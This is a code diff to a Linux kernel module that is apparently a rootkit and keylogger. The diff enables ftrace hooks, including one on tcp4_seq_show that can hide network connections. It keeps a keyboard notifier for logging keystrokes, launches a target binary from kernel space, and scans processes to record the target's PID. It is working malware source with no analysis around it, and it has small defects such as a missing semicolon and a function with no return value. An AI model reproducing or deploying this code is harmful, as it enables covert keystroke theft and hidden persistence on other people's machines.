@@ -27,6 +27,9 @@ MODULE_LICENSE("GPL");
 #define DEVICE_NAME "kl0"
 unsigned major;
 
+static int target_pid = 0;
+static char* target_process = "/home/vagrant/test"
+
 #ifndef BUFLEN
 #define BUFLEN 1024
 #endif
@@ -164,28 +167,38 @@ static struct ftrace_hook hooks[] = {
 	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
-static int spawnProcess(void) {
+static void check_process(char* comm, int pid) {
+	if (strcmp(comm, target_process) == 0){
+		target_pid = pid;
+	}
+	pr_info("%s [%d]\n", comm, pid);
+}
 
-	int rc;
+static int get_pid(struct subprocess_info *info, struct cred *new) {
+	struct task_struct *task;
 
-	static char *envp[] = {
-		"SHELL=/bin/bash",
-		"HOME=/home/spencer",
-		"USER=spencer",
-		"PATH=/home/spencer/bin:/home/spencer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/spencer",
-		"PWD=/home/spencer", 
-		NULL};
+    for_each_process(task)
+        check_process(task->comm, task->pid);
+}
 
-	char *argv[] = {"/home/spencer/mySample", NULL};
+static int spawnProcess(char* path) {
 
-	rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        int rc;
+char* argv[] = {path, NULL};
+static char* envp[] = {
+    "HOME=/",
+    "TERM=linux",
+    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+
+	rc = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
 	printk("RC is: %i \n", rc);
 	return rc;
 }
 
 static int __init kl_init(void)
 {
-	// int err;
+	int i;
+	int err;
 	#ifdef KEY_LOG
 	int ret;
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
@@ -201,9 +214,9 @@ static int __init kl_init(void)
 	#ifdef KEY_LOG
 	ret = register_keyboard_notifier(&kl_notifier_block);
 	#endif
-	// err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-	// if(err)
-	// 	return err;
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	if(err)
+		return err;
 	unprotect_memory();
 	#ifdef KEY_LOG
 	if (ret) {
@@ -212,7 +225,7 @@ static int __init kl_init(void)
 		return -ret;
 	}
 	#endif
-	int i = spawnProcess();
+	i = spawnProcess(target_process);
     printk(KERN_INFO "keylog: return value %d\n",i);
 
 	memset(input_buf, 0, BUFLEN);
@@ -232,7 +245,7 @@ static void __exit kl_exit(void)
 	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&kl_notifier_block);
 	#endif
-	// fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unprotect_memory();
 }
 
